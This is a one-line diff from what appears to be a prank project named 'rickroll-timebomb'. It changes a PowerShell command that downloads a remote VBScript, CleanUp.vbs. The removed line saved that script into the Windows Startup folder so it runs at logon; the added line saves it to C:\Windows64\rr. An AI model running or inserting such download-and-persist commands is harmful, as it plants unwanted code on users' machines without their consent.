@@ -1,1 +1,1 @@
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/CleanUp.vbs -OutFile %userprofile%\AppData\Roaming\Microsoft\Windows\Start` Menu\Programs\Startup\rr\CleanUp.vbs"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/Hamy-os/rickroll-timebomb/main/Files/CleanUp.vbs -OutFile C:\Windows64\rr\CleanUp.vbs"
